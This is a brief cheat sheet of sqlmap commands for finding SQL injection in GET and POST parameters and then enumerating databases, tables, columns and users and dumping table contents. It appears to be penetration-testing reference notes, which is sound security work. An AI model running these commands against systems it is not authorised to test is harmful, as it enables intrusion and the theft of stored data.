### source
https://github.com/sqlmapproject/sqlmap  

### scan GET parameter, -u URL, -p parameter
```
sqlmap -u http://<domain>/<path>.php?<var>=1 -p <var>
```

### scan POST parameter (save Burp Request to file), -r read file
```
sqlmap -r <file> -p <var>
```

### or mark *var* within burp request before pasting to file
```
sqlmap -r <file>
```

### once you found a SQL injection - get the database names
```
sqlmap -r <file> -p <var> --dbs
```

### get the tables of a database, -D database
```
sqlmap -r <file> -p <var> --tables -D <database>
```

### get the columns of a specific table, -T table
```
sqlmap -r <file> -p <var> --columns -D <database> -T <table>
```

### get the content of the columns
```
sqlmap -r <file> -p <var> --dump -D <database> -T <table>
```

### get database system users
```
sqlmap -r <file> -p <var> --users
```

### get current database system user
```
sqlmap -r <file> -p <var> --current-user
```

